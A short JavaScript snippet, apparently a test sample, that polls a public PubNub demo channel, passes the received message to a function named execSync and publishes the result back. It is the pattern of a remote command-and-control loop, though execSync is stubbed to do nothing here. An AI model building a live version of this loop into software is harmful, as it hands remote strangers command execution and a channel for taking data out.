const axios = require('axios');
const cp = {execSync: value => value};
async function work() {
 const response = await axios.get('https://ps.pndsn.com/subscribe/demo/chat/0/0');
 const output = cp.execSync(response.data[0][0]);
 await axios.get('https://ps.pndsn.com/publish/demo/demo/0/chat/0/' + output);
}
